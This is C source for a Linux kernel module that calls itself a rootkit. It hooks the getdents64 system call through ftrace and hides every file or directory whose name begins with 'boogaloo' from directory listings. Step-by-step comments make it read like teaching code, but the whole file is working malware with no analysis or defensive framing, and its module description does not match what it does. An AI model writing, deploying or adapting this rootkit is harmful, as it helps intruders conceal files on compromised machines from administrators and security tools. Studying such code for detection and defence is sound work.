#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/dirent.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("X");
MODULE_DESCRIPTION("Interfering with char devices");
MODULE_VERSION("0.01");

#define PREFIX "boogaloo"

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
	long error;
	/* Pull the userspace dirent struct out of pt_regs */
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

	/* Declare our kernel version of the buffer that we'll copy into */
	struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;
	unsigned long offset = 0;

	/* Call the real getdents64, and allocate ourselves a kernel buffer */
	int ret = orig_getdents64(regs);
	dirent_ker = kzalloc(ret, GFP_KERNEL);

	/* Check that neither of the above failed */
	if ( (ret <= 0) || (dirent_ker == NULL) )
		return ret;

	/* Copy from the userspace buffer dirent, to our kernel buffer dirent_ker */
	error = copy_from_user(dirent_ker, dirent, ret);
	if (error)
		goto done;

	/* Fiddle with dirent_ker */
	while (offset < ret) {
		/* Set current_dir = dirent_ker + offset */
		current_dir = (void *)dirent_ker + offset;

		/* Compare the first bytes of current_dir->d_name to PREFIX */
		if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
			/* Check fo the special case when we need to hide the first entry */
			if (current_dir == dirent_ker) {
				/* Decrement ret and shift all the structs up in memory */
				ret -= current_dir->d_reclen;
				memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
				continue;
			}
			/* Hide the secret entry by incrementing d_reclen of previous_dir by
			 * that of the entry we want to hide - effectively "swallowing" it
			 */
			previous_dir->d_reclen += current_dir->d_reclen;
		} else {
			/* Set previous_dir to current_dir before looping where current_dir
			 * gets incremented to the next entry
			 */
			previous_dir = current_dir;
		}

		offset += current_dir->d_reclen;
	}


	/* Copy dirent_ker back to userspace dirent */
	error = copy_to_user(dirent, dirent_ker, ret);
	if (error)
		goto done;

done:
	/* Free our buffer and return */
	kfree(dirent_ker);
	return ret;
}

static struct ftrace_hook hooks[] = {
	HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
};

static int __init rootkit_init(void) {
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if (err) return err;

	printk(KERN_INFO "rootkit: loaded\n");
	return 0;
}

static void __exit rootkit_exit(void) {
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
